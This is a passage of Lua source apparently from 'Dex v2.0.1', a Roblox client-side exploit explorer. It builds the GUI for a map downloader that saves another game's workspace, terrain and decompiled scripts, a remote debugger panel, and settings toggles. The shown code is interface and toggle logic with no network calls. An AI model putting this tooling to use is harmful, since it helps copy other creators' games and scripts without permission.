Slant_2.BorderSizePixel = 0
Slant_2.ClipsDescendants = true
Slant_2.Position = UDim2.new(0, -27, 0, 86)
Slant_2.Rotation = 45
Slant_2.Size = UDim2.new(0, 60, 0, 30)
Slant_2.ZIndex = 3

ImageLabel_2.Parent = Slant_2
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
ImageLabel_2.BackgroundTransparency = 1
ImageLabel_2.BorderSizePixel = 0
ImageLabel_2.Size = UDim2.new(1, 0, 1, 0)
ImageLabel_2.ZIndex = 2
ImageLabel_2.Image = "rbxassetid://474172996"
ImageLabel_2.ScaleType = Enum.ScaleType.Tile
ImageLabel_2.TileSize = UDim2.new(25, 0, 6, 0)
ImageLabel_2.ImageColor3 = Color3.fromRGB(43, 43, 43)

SaveMapWindow.Name = "SaveMapWindow"
SaveMapWindow.Parent = ROBLOX
SaveMapWindow.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
SaveMapWindow.BorderColor3 = Color3.fromRGB(191, 191, 191)
SaveMapWindow.BorderSizePixel = 0
SaveMapWindow.Position = UDim2.new(1, 0, 0, 1)
SaveMapWindow.Size = UDim2.new(0, 300, 1, 0)

Header_3.Name = "Header"
Header_3.Parent = SaveMapWindow
Header_3.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Header_3.BorderColor3 = Color3.fromRGB(30, 30, 30)
Header_3.Size = UDim2.new(1, 0, 0, 17)

TextLabel_3.Parent = Header_3
TextLabel_3.BackgroundTransparency = 1
TextLabel_3.Position = UDim2.new(0, 4, 0, 0)
TextLabel_3.Size = UDim2.new(1, -4, 1, 0)
TextLabel_3.Font = Enum.Font.SourceSans
TextLabel_3.Text = "Map Downloader"
TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.TextSize = 14
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left

MapSettings.Name = "MapSettings"
MapSettings.Parent = SaveMapWindow
MapSettings.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
MapSettings.BackgroundTransparency = 1
MapSettings.BorderSizePixel = 0
MapSettings.Position = UDim2.new(0, 0, 0, 200)
MapSettings.Size = UDim2.new(1, 0, 0, 240)

Terrain.Name = "Terrain"
Terrain.Parent = MapSettings
Terrain.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Terrain.BackgroundTransparency = 1
Terrain.BorderSizePixel = 0
Terrain.Position = UDim2.new(0, 0, 0, 60)
Terrain.Size = UDim2.new(1, 0, 0, 60)

SName_2.Name = "SName"
SName_2.Parent = Terrain
SName_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SName_2.BackgroundTransparency = 1
SName_2.BorderColor3 = Color3.fromRGB(40, 40, 40)
SName_2.Position = UDim2.new(0, 10, 0, 0)
SName_2.Size = UDim2.new(1, -20, 0, 30)
SName_2.Font = Enum.Font.SourceSans
SName_2.Text = "Save Terrain"
SName_2.TextColor3 = Color3.fromRGB(255, 255, 255)
SName_2.TextSize = 18
SName_2.TextXAlignment = Enum.TextXAlignment.Left

Status_2.Name = "Status"
Status_2.Parent = Terrain
Status_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Status_2.BackgroundTransparency = 1
Status_2.BorderColor3 = Color3.fromRGB(40, 40, 40)
Status_2.Position = UDim2.new(0, 60, 0, 30)
Status_2.Size = UDim2.new(0, 50, 0, 15)
Status_2.Font = Enum.Font.SourceSans
Status_2.Text = "Off"
Status_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Status_2.TextSize = 18
Status_2.TextXAlignment = Enum.TextXAlignment.Left

Change_2.Name = "Change"
Change_2.Parent = Terrain
Change_2.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
Change_2.BorderColor3 = Color3.fromRGB(40, 40, 40)
Change_2.BorderSizePixel = 0
Change_2.Position = UDim2.new(0, 10, 0, 30)
Change_2.Size = UDim2.new(0, 40, 0, 15)
Change_2.Font = Enum.Font.SourceSans
Change_2.Text = ""
Change_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Change_2.TextSize = 14

OnBar_2.Name = "OnBar"
OnBar_2.Parent = Change_2
OnBar_2.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
OnBar_2.BorderSizePixel = 0
OnBar_2.Size = UDim2.new(0, 0, 0, 15)
OnBar_2.Font = Enum.Font.SourceSans
OnBar_2.Text = ""
OnBar_2.TextSize = 14

Bar_2.Name = "Bar"
Bar_2.Parent = Change_2
Bar_2.BackgroundColor3 = Color3.fromRGB(219, 47, 84)
Bar_2.BorderSizePixel = 0
Bar_2.ClipsDescendants = true
Bar_2.Position = UDim2.new(0, -2, 0, -2)
Bar_2.Size = UDim2.new(0, 10, 0, 19)
Bar_2.Font = Enum.Font.SourceSans
Bar_2.Text = ""
Bar_2.TextSize = 14

Lighting.Name = "Lighting"
Lighting.Parent = MapSettings
Lighting.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Lighting.BackgroundTransparency = 1
Lighting.BorderSizePixel = 0
Lighting.Position = UDim2.new(0, 0, 0, 120)
Lighting.Size = UDim2.new(1, 0, 0, 60)

SName_3.Name = "SName"
SName_3.Parent = Lighting
SName_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SName_3.BackgroundTransparency = 1
SName_3.BorderColor3 = Color3.fromRGB(40, 40, 40)
SName_3.Position = UDim2.new(0, 10, 0, 0)
SName_3.Size = UDim2.new(1, -20, 0, 30)
SName_3.Font = Enum.Font.SourceSans
SName_3.Text = "Lighting Properties"
SName_3.TextColor3 = Color3.fromRGB(255, 255, 255)
SName_3.TextSize = 18
SName_3.TextXAlignment = Enum.TextXAlignment.Left

Status_3.Name = "Status"
Status_3.Parent = Lighting
Status_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Status_3.BackgroundTransparency = 1
Status_3.BorderColor3 = Color3.fromRGB(40, 40, 40)
Status_3.Position = UDim2.new(0, 60, 0, 30)
Status_3.Size = UDim2.new(0, 50, 0, 15)
Status_3.Font = Enum.Font.SourceSans
Status_3.Text = "Off"
Status_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Status_3.TextSize = 18
Status_3.TextXAlignment = Enum.TextXAlignment.Left

Change_3.Name = "Change"
Change_3.Parent = Lighting
Change_3.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
Change_3.BorderColor3 = Color3.fromRGB(40, 40, 40)
Change_3.BorderSizePixel = 0
Change_3.Position = UDim2.new(0, 10, 0, 30)
Change_3.Size = UDim2.new(0, 40, 0, 15)
Change_3.Font = Enum.Font.SourceSans
Change_3.Text = ""
Change_3.TextColor3 = Color3.fromRGB(255, 255, 255)
Change_3.TextSize = 14

OnBar_3.Name = "OnBar"
OnBar_3.Parent = Change_3
OnBar_3.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
OnBar_3.BorderSizePixel = 0
OnBar_3.Size = UDim2.new(0, 0, 0, 15)
OnBar_3.Font = Enum.Font.SourceSans
OnBar_3.Text = ""
OnBar_3.TextSize = 14

Bar_3.Name = "Bar"
Bar_3.Parent = Change_3
Bar_3.BackgroundColor3 = Color3.fromRGB(219, 47, 84)
Bar_3.BorderSizePixel = 0
Bar_3.ClipsDescendants = true
Bar_3.Position = UDim2.new(0, -2, 0, -2)
Bar_3.Size = UDim2.new(0, 10, 0, 19)
Bar_3.Font = Enum.Font.SourceSans
Bar_3.Text = ""
Bar_3.TextSize = 14

CameraInstances.Name = "CameraInstances"
CameraInstances.Parent = MapSettings
CameraInstances.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
CameraInstances.BackgroundTransparency = 1
CameraInstances.BorderSizePixel = 0
CameraInstances.Position = UDim2.new(0, 0, 0, 180)
CameraInstances.Size = UDim2.new(1, 0, 0, 60)

SName_4.Name = "SName"
SName_4.Parent = CameraInstances
SName_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SName_4.BackgroundTransparency = 1
SName_4.BorderColor3 = Color3.fromRGB(40, 40, 40)
SName_4.Position = UDim2.new(0, 10, 0, 0)
SName_4.Size = UDim2.new(1, -20, 0, 30)
SName_4.Font = Enum.Font.SourceSans
SName_4.Text = "Camera Instances"
SName_4.TextColor3 = Color3.fromRGB(255, 255, 255)
SName_4.TextSize = 18
SName_4.TextXAlignment = Enum.TextXAlignment.Left

Status_4.Name = "Status"
Status_4.Parent = CameraInstances
Status_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Status_4.BackgroundTransparency = 1
Status_4.BorderColor3 = Color3.fromRGB(40, 40, 40)
Status_4.Position = UDim2.new(0, 60, 0, 30)
Status_4.Size = UDim2.new(0, 50, 0, 15)
Status_4.Font = Enum.Font.SourceSans
Status_4.Text = "Off"
Status_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Status_4.TextSize = 18
Status_4.TextXAlignment = Enum.TextXAlignment.Left

Change_4.Name = "Change"
Change_4.Parent = CameraInstances
Change_4.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
Change_4.BorderColor3 = Color3.fromRGB(40, 40, 40)
Change_4.BorderSizePixel = 0
Change_4.Position = UDim2.new(0, 10, 0, 30)
Change_4.Size = UDim2.new(0, 40, 0, 15)
Change_4.Font = Enum.Font.SourceSans
Change_4.Text = ""
Change_4.TextColor3 = Color3.fromRGB(255, 255, 255)
Change_4.TextSize = 14

OnBar_4.Name = "OnBar"
OnBar_4.Parent = Change_4
OnBar_4.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
OnBar_4.BorderSizePixel = 0
OnBar_4.Size = UDim2.new(0, 0, 0, 15)
OnBar_4.Font = Enum.Font.SourceSans
OnBar_4.Text = ""
OnBar_4.TextSize = 14

Bar_4.Name = "Bar"
Bar_4.Parent = Change_4
Bar_4.BackgroundColor3 = Color3.fromRGB(219, 47, 84)
Bar_4.BorderSizePixel = 0
Bar_4.ClipsDescendants = true
Bar_4.Position = UDim2.new(0, -2, 0, -2)
Bar_4.Size = UDim2.new(0, 10, 0, 19)
Bar_4.Font = Enum.Font.SourceSans
Bar_4.Text = ""
Bar_4.TextSize = 14

Scripts.Name = "Scripts"
Scripts.Parent = MapSettings
Scripts.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Scripts.BackgroundTransparency = 1
Scripts.BorderSizePixel = 0
Scripts.Size = UDim2.new(1, 0, 0, 60)

SName_5.Name = "SName"
SName_5.Parent = Scripts
SName_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SName_5.BackgroundTransparency = 1
SName_5.BorderColor3 = Color3.fromRGB(40, 40, 40)
SName_5.Position = UDim2.new(0, 10, 0, 0)
SName_5.Size = UDim2.new(1, -20, 0, 30)
SName_5.Font = Enum.Font.SourceSans
SName_5.Text = "Save Scripts"
SName_5.TextColor3 = Color3.fromRGB(255, 255, 255)
SName_5.TextSize = 18
SName_5.TextXAlignment = Enum.TextXAlignment.Left

Status_5.Name = "Status"
Status_5.Parent = Scripts
Status_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Status_5.BackgroundTransparency = 1
Status_5.BorderColor3 = Color3.fromRGB(40, 40, 40)
Status_5.Position = UDim2.new(0, 60, 0, 30)
Status_5.Size = UDim2.new(0, 50, 0, 15)
Status_5.Font = Enum.Font.SourceSans
Status_5.Text = "Off"
Status_5.TextColor3 = Color3.fromRGB(255, 255, 255)
Status_5.TextSize = 18
Status_5.TextXAlignment = Enum.TextXAlignment.Left

Change_5.Name = "Change"
Change_5.Parent = Scripts
Change_5.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
Change_5.BorderColor3 = Color3.fromRGB(40, 40, 40)
Change_5.BorderSizePixel = 0
Change_5.Position = UDim2.new(0, 10, 0, 30)
Change_5.Size = UDim2.new(0, 40, 0, 15)
Change_5.Font = Enum.Font.SourceSans
Change_5.Text = ""
Change_5.TextColor3 = Color3.fromRGB(255, 255, 255)
Change_5.TextSize = 14

OnBar_5.Name = "OnBar"
OnBar_5.Parent = Change_5
OnBar_5.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
OnBar_5.BorderSizePixel = 0
OnBar_5.Size = UDim2.new(0, 0, 0, 15)
OnBar_5.Font = Enum.Font.SourceSans
OnBar_5.Text = ""
OnBar_5.TextSize = 14

Bar_5.Name = "Bar"
Bar_5.Parent = Change_5
Bar_5.BackgroundColor3 = Color3.fromRGB(219, 47, 84)
Bar_5.BorderSizePixel = 0
Bar_5.ClipsDescendants = true
Bar_5.Position = UDim2.new(0, -2, 0, -2)
Bar_5.Size = UDim2.new(0, 10, 0, 19)
Bar_5.Font = Enum.Font.SourceSans
Bar_5.Text = ""
Bar_5.TextSize = 14

ToSave.Name = "ToSave"
ToSave.Parent = SaveMapWindow
ToSave.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
ToSave.BackgroundTransparency = 1
ToSave.Position = UDim2.new(0, 0, 0, 17)
ToSave.Size = UDim2.new(1, 0, 0, 20)
ToSave.Font = Enum.Font.SourceSans
ToSave.Text = "To Save"
ToSave.TextColor3 = Color3.fromRGB(255, 255, 255)
ToSave.TextSize = 18

CopyList.Name = "CopyList"
CopyList.Parent = SaveMapWindow
CopyList.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
CopyList.BackgroundTransparency = 0.4
CopyList.BorderSizePixel = 0
CopyList.Position = UDim2.new(0, 0, 0, 37)
CopyList.Size = UDim2.new(1, 0, 0, 163)

Bottom.Name = "Bottom"
Bottom.Parent = SaveMapWindow
Bottom.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
Bottom.BorderColor3 = Color3.fromRGB(30, 30, 30)
Bottom.BorderSizePixel = 0
Bottom.Position = UDim2.new(0, 0, 1, -50)
Bottom.Size = UDim2.new(1, 0, 0, 50)

TextLabel_4.Parent = Bottom
TextLabel_4.BackgroundTransparency = 1
TextLabel_4.Position = UDim2.new(0, 4, 0, 0)
TextLabel_4.Size = UDim2.new(1, -4, 1, 0)
TextLabel_4.Font = Enum.Font.SourceSans
TextLabel_4.Text = "After the map saves, open a new place on studio, then right click Lighting and \"Insert from file...\", then select your file and run the unpacker script inside the folder."
TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_4.TextSize = 14
TextLabel_4.TextWrapped = true
TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_4.TextYAlignment = Enum.TextYAlignment.Top

Save_2.Name = "Save"
Save_2.Parent = SaveMapWindow
Save_2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
Save_2.BackgroundTransparency = 0.4
Save_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Save_2.BorderSizePixel = 0
Save_2.Position = UDim2.new(0, 0, 1, -80)
Save_2.Size = UDim2.new(1, 0, 0, 30)
Save_2.Font = Enum.Font.SourceSans
Save_2.Text = "Save"
Save_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Save_2.TextSize = 18

FileName_2.Name = "FileName"
FileName_2.Parent = SaveMapWindow
FileName_2.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
FileName_2.BackgroundTransparency = 0.4
FileName_2.BorderSizePixel = 0
FileName_2.Position = UDim2.new(0, 0, 1, -105)
FileName_2.Size = UDim2.new(1, 0, 0, 25)
FileName_2.Font = Enum.Font.SourceSans
FileName_2.Text = "   PlaceName"
FileName_2.TextColor3 = Color3.fromRGB(255, 255, 255)
FileName_2.TextSize = 18
FileName_2.TextXAlignment = Enum.TextXAlignment.Left

Entry_2.Name = "Entry"
Entry_2.Parent = SaveMapWindow
Entry_2.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Entry_2.BackgroundTransparency = 1
Entry_2.BorderSizePixel = 0
Entry_2.Size = UDim2.new(1, 0, 0, 22)
Entry_2.Visible = false

Change_6.Name = "Change"
Change_6.Parent = Entry_2
Change_6.BackgroundColor3 = Color3.fromRGB(219, 47, 84)
Change_6.BackgroundTransparency = 0.6
Change_6.Position = UDim2.new(0, 10, 0, 1)
Change_6.Size = UDim2.new(0, 20, 0, 20)
Change_6.ZIndex = 2
Change_6.Font = Enum.Font.SourceSans
Change_6.Text = ""
Change_6.TextColor3 = Color3.fromRGB(255, 255, 255)
Change_6.TextSize = 18

enabled_3.Name = "enabled"
enabled_3.Parent = Change_6
enabled_3.BackgroundColor3 = Color3.fromRGB(197, 28, 70)
enabled_3.BackgroundTransparency = 0.4
enabled_3.BorderSizePixel = 0
enabled_3.Position = UDim2.new(0, 3, 0, 3)
enabled_3.Size = UDim2.new(0, 14, 0, 14)
enabled_3.Font = Enum.Font.SourceSans
enabled_3.Text = ""
enabled_3.TextColor3 = Color3.fromRGB(255, 255, 255)
enabled_3.TextSize = 14

Info.Name = "Info"
Info.Parent = Entry_2
Info.BackgroundTransparency = 1
Info.Position = UDim2.new(0, 40, 0, 0)
Info.Size = UDim2.new(1, -40, 0, 22)
Info.Font = Enum.Font.SourceSans
Info.Text = "Workspace"
Info.TextColor3 = Color3.fromRGB(255, 255, 255)
Info.TextSize = 18
Info.TextXAlignment = Enum.TextXAlignment.Left

RemoteDebugWindow.Name = "RemoteDebugWindow"
RemoteDebugWindow.Parent = ROBLOX
RemoteDebugWindow.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
RemoteDebugWindow.BorderColor3 = Color3.fromRGB(191, 191, 191)
RemoteDebugWindow.BorderSizePixel = 0
RemoteDebugWindow.Position = UDim2.new(1, 0, 0, 1)
RemoteDebugWindow.Size = UDim2.new(0, 300, 1, 0)

Header_4.Name = "Header"
Header_4.Parent = RemoteDebugWindow
Header_4.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Header_4.BorderColor3 = Color3.fromRGB(30, 30, 30)
Header_4.Size = UDim2.new(1, 0, 0, 17)

TextLabel_5.Parent = Header_4
TextLabel_5.BackgroundTransparency = 1
TextLabel_5.Position = UDim2.new(0, 4, 0, 0)
TextLabel_5.Size = UDim2.new(1, -4, 1, 0)
TextLabel_5.Font = Enum.Font.SourceSans
TextLabel_5.Text = "Remote Debugger"
TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_5.TextSize = 14
TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left

AboutWindow.Name = "AboutWindow"
AboutWindow.Parent = ROBLOX
AboutWindow.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
AboutWindow.BorderColor3 = Color3.fromRGB(191, 191, 191)
AboutWindow.BorderSizePixel = 0
AboutWindow.Position = UDim2.new(1, 0, 0, 1)
AboutWindow.Size = UDim2.new(0, 300, 1, 0)

Header_5.Name = "Header"
Header_5.Parent = AboutWindow
Header_5.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
Header_5.BorderColor3 = Color3.fromRGB(30, 30, 30)
Header_5.Size = UDim2.new(1, 0, 0, 17)

TextLabel_6.Parent = Header_5
TextLabel_6.BackgroundTransparency = 1
TextLabel_6.Position = UDim2.new(0, 4, 0, 0)
TextLabel_6.Size = UDim2.new(1, -4, 1, 0)
TextLabel_6.Font = Enum.Font.SourceSans
TextLabel_6.Text = "About"
TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_6.TextSize = 14
TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left

Title_9.Name = "Logo"
Title_9.Parent = AboutWindow
Title_9.BackgroundTransparency = 1
Title_9.Position = UDim2.new(0, 100, 0, 70)
Title_9.Size = UDim2.new(0, 100, 0, 90)
Title_9.ZIndex = 4
Title_9.Image = "http://www.roblox.com/asset/?id=4540274383"
Title_9.ScaleType = Enum.ScaleType.Fit

Desc_6.Name = "Desc"
Desc_6.Parent = AboutWindow
Desc_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Desc_6.BackgroundTransparency = 1
Desc_6.Position = UDim2.new(0.1, 0, 0.1, 0)
Desc_6.Size = UDim2.new(0.8, 0, 0, 200)
Desc_6.Font = Enum.Font.SourceSans
Desc_6.Text = "Dex v2.0.1\nEdited by Google Chrome & CriShoux"
Desc_6.TextColor3 = Color3.fromRGB(197, 28, 70)
Desc_6.TextSize = 24
Desc_6.TextWrapped = true

local NewGuiPart153 = Instance.new("BindableFunction")
local NewGuiPart154 = Instance.new("BindableFunction")
local NewGuiPart155 = Instance.new("BindableFunction")
local NewGuiPart156 = Instance.new("BindableFunction")
local NewGuiPart157 = Instance.new("BindableEvent")
local NewGuiPart158 = Instance.new("BindableFunction")
local NewGuiPart159 = Instance.new("BindableFunction")
local NewGuiPart160 = Instance.new("BindableEvent")
local NewGuiPart161 = Instance.new("BindableFunction")
local NewGuiPart162 = Instance.new("BindableFunction")
local NewGuiPart163 = Instance.new("BindableEvent")

NewGuiPart158.Name = "GetApi"
NewGuiPart158.Parent = PropertiesFrame
NewGuiPart158.Archivable = true

NewGuiPart159.Name = "GetAwaiting"
NewGuiPart159.Parent = PropertiesFrame
NewGuiPart159.Archivable = true

NewGuiPart160.Name = "SetAwaiting"
NewGuiPart160.Parent = PropertiesFrame
NewGuiPart160.Archivable = true

NewGuiPart153.Name = "GetOption"
NewGuiPart153.Parent = ExplorerPanel
NewGuiPart153.Archivable = true

NewGuiPart154.Name = "GetSelection"
NewGuiPart154.Parent = ExplorerPanel
NewGuiPart154.Archivable = true

NewGuiPart155.Name = "SetOption"
NewGuiPart155.Parent = ExplorerPanel
NewGuiPart155.Archivable = true

NewGuiPart156.Name = "SetSelection"
NewGuiPart156.Parent = ExplorerPanel
NewGuiPart156.Archivable = true

NewGuiPart157.Name = "SelectionChanged"
NewGuiPart157.Parent = ExplorerPanel
NewGuiPart157.Archivable = true

NewGuiPart161.Name = "GetSetting"
NewGuiPart161.Parent = RemoteDebugWindow
NewGuiPart161.Archivable = true

NewGuiPart162.Name = "GetSetting"
NewGuiPart162.Parent = SettingsPanel
NewGuiPart162.Archivable = true

NewGuiPart163.Name = "OpenScript"
NewGuiPart163.Parent = ScriptEditor
NewGuiPart163.Archivable = true

return ROBLOX
end

local D_E_X = CreateGui()
D_E_X.Parent = coregui.RobloxGui;

spawn(function()

local Gui = D_E_X

local IntroFrame = Gui:WaitForChild("IntroFrame")

local SideMenu = Gui:WaitForChild("SideMenu")
local OpenToggleButton = Gui:WaitForChild("Toggle")
local CloseToggleButton = SideMenu:WaitForChild("Toggle")
local OpenScriptEditorButton = SideMenu:WaitForChild("OpenScriptEditor")

local ScriptEditor = Gui:WaitForChild("ScriptEditor")

local SlideOut = SideMenu:WaitForChild("SlideOut")
local SlideFrame = SlideOut:WaitForChild("SlideFrame")
local Slant = SideMenu:WaitForChild("Slant")

local ExplorerButton = SlideFrame:WaitForChild("Explorer")
local SettingsButton = SlideFrame:WaitForChild("Settings")

local SelectionBox = Instance.new("SelectionBox")
SelectionBox.Parent = Gui

local ExplorerPanel = Gui:WaitForChild("ExplorerPanel")
local PropertiesFrame = Gui:WaitForChild("PropertiesFrame")
local SaveMapWindow = Gui:WaitForChild("SaveMapWindow")
local RemoteDebugWindow = Gui:WaitForChild("RemoteDebugWindow")
local AboutWindow = Gui:WaitForChild("AboutWindow")

local SettingsPanel = Gui:WaitForChild("SettingsPanel")
local SettingsListener = SettingsPanel:WaitForChild("GetSetting")
local SettingTemplate = SettingsPanel:WaitForChild("SettingTemplate")
local SettingList = SettingsPanel:WaitForChild("SettingList")

local SaveMapCopyList = SaveMapWindow:WaitForChild("CopyList")
local SaveMapSettingFrame = SaveMapWindow:WaitForChild("MapSettings")
local SaveMapName = SaveMapWindow:WaitForChild("FileName")
local SaveMapButton = SaveMapWindow:WaitForChild("Save")
local SaveMapCopyTemplate = SaveMapWindow:WaitForChild("Entry")
local SaveMapSettings = {
	CopyWhat = {
		Workspace = true,
		Lighting = true,
		ReplicatedStorage = true,
		ReplicatedFirst = true,
		StarterPack = true,
		StarterGui = true,
		StarterPlayer = true
	},
	SaveScripts = true,
	SaveTerrain = true,
	LightingProperties = true,
	CameraInstances = true
}

local SelectionChanged = ExplorerPanel:WaitForChild("SelectionChanged")
local GetSelection = ExplorerPanel:WaitForChild("GetSelection")
local SetSelection = ExplorerPanel:WaitForChild("SetSelection")

local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()

local CurrentWindow = "Nothing c:"
local Windows = {
	Explorer = {
		ExplorerPanel,
		PropertiesFrame
	},
	Settings = {SettingsPanel},
	SaveMap = {SaveMapWindow},
	About = {AboutWindow}
}

function switchWindows(wName,over)
	if CurrentWindow == wName and not over then return end
	
	local count = 0
	
	for i,v in pairs(Windows) do
		count = 0
		if i ~= wName then
			for _,c in pairs(v) do c:TweenPosition(UDim2.new(1, 30, c.Position.Y.Scale, c.Position.Y.Offset), "Out", "Quad", 0.5, true) count = count + 1 end
			-- for _,c in pairs(v) do c:TweenPosition(UDim2.new(1, 30, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
		end
	end
	
	count = 0
	
	if Windows[wName] then
		for _,c in pairs(Windows[wName]) do c:TweenPosition(UDim2.new(1, -300, c.Position.Y.Scale, c.Position.Y.Offset), "Out", "Quad", 0.5, true) count = count + 1 end
		-- for _,c in pairs(Windows[wName]) do c:TweenPosition(UDim2.new(1, -300, count * 0.5, count * 36), "Out", "Quad", 0.5, true) count = count + 1 end
	end
	
	if wName ~= "Nothing c:" then
		CurrentWindow = wName
		for i,v in pairs(SlideFrame:GetChildren()) do
			v.AutoButtonColor = false;
			v.BackgroundTransparency = 1
			v.Icon.ImageColor3 = Color3.fromRGB(197, 28, 70)
		end
		if SlideFrame:FindFirstChild(wName) then
			-- SlideFrame[wName].BackgroundTransparency = 1
			SlideFrame[wName].Icon.ImageColor3 = Color3.fromRGB(197, 28, 70)
		end
	end
end

function toggleDex(on)
	if on then
		SideMenu:TweenPosition(UDim2.new(1, -330, 0, 0), "Out", "Quad", 0.5, true)
		OpenToggleButton:TweenPosition(UDim2.new(1,0,0,0), "Out", "Quad", 0.5, true)
		switchWindows(CurrentWindow,true)
	else
		SideMenu:TweenPosition(UDim2.new(1, 0, 0, 0), "Out", "Quad", 0.5, true)
		OpenToggleButton:TweenPosition(UDim2.new(1,-30,0,0), "Out", "Quad", 0.5, true)
		switchWindows("Nothing c:")
	end
end

local Settings = {
	ClickSelect = false;
	SelBox = false;
	ClearProps = false;
	SelectUngrouped = true;
	SaveInstanceScripts = true;
}

function ReturnSetting(set)
	if set == "ClearProps" then
		return Settings.ClearProps
	elseif set == "SelectUngrouped" then
		return Settings.SelectUngrouped
	end
end

OpenToggleButton.MouseButton1Up:connect(function()
	toggleDex(true)
end)

OpenScriptEditorButton.MouseButton1Up:connect(function()
	if OpenScriptEditorButton.Active then
		ScriptEditor.Visible = true
	end
end)

CloseToggleButton.MouseButton1Up:connect(function()
	if CloseToggleButton.Active then
		toggleDex(false)
	end
end)

for i,v in pairs(SlideFrame:GetChildren()) do
	v.MouseButton1Click:connect(function()
		switchWindows(v.Name)
	end)
	
	-- v.MouseEnter:connect(function()v.BackgroundTransparency = 0.5 end)
	-- v.MouseLeave:connect(function()if CurrentWindow~=v.Name then v.BackgroundTransparency = 1 end end)
end


function createSetting(name, interName, defaultOn, func)
	local newSetting = SettingTemplate:Clone()
	newSetting.Position = UDim2.new(0,0,0,#SettingList:GetChildren() * 60)
	newSetting.SName.Text = name
	
	local function toggle(on)
		if on then
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "On"
			Settings[interName] = true
		else
			newSetting.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			newSetting.Status.Text = "Off"
			Settings[interName] = false
		end
	end	
	
	newSetting.Change.MouseButton1Click:connect(function()
		toggle(not Settings[interName])
		if func then pcall(func, Settings[interName]) end
	end)
	
	newSetting.Visible = true
	newSetting.Parent = SettingList
	
	if defaultOn then
		toggle(true)
	end
end

createSetting("Click part to select","ClickSelect",false)
createSetting("Selection Box","SelBox",false)
createSetting("Clear property value on focus","ClearProps",false)
createSetting("Select ungrouped models","SelectUngrouped",true)
createSetting("SaveInstance decompiles scripts","SaveInstanceScripts",true)

local function getSelection()
	local t = GetSelection:Invoke()
	if t and #t > 0 then
		return t[1]
	else
		return nil
	end
end

Mouse.Button1Down:connect(function()
	if CurrentWindow == "Explorer" and Settings.ClickSelect then
		local target = Mouse.Target
		if target then
			SetSelection:Invoke({target})
		end
	end
end)

SelectionChanged.Event:connect(function()
	if Settings.SelBox then
		local success,err = pcall(function()
			local selection = getSelection()
			SelectionBox.Adornee = selection
		end)
		if err then
			SelectionBox.Adornee = nil
		end
	end
end)

SettingsListener.OnInvoke = ReturnSetting

-- Map Copier

function createMapSetting(obj,interName,defaultOn)
	local function toggle(on)
		if on then
			obj.Change.Bar:TweenPosition(UDim2.new(0,32,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,34,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "On"
			SaveMapSettings[interName] = true
		else
			obj.Change.Bar:TweenPosition(UDim2.new(0,-2,0,-2),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Change.OnBar:TweenSize(UDim2.new(0,0,0,15),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			obj.Status.Text = "Off"
			SaveMapSettings[interName] = false
		end
	end	
	
	obj.Change.MouseButton1Click:connect(function()
		toggle(not SaveMapSettings[interName])
	end)
	
